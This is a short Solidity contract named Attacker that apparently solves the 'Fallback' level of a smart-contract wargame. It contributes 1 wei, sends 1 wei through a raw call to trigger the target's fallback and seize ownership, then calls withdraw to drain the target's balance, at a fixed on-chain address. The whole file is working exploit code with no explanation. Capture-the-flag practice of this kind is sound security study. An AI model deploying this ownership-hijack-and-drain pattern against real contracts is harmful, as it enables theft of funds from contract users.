// SPDX-License-Identifier : MIT
pragma solidity ^0.8.0;

import "../src/level01.sol";


contract Attacker
{
    Fallback level01 = Fallback(payable(address(0x8da2eDCc38441696FccA95cE63BCb24850916807)));

    function test() external
    {
        level01.contribute{value: 1 wei}();
        payable(address(level01)).call{value: 1 wei}("");
        level01.withdraw();
    }
}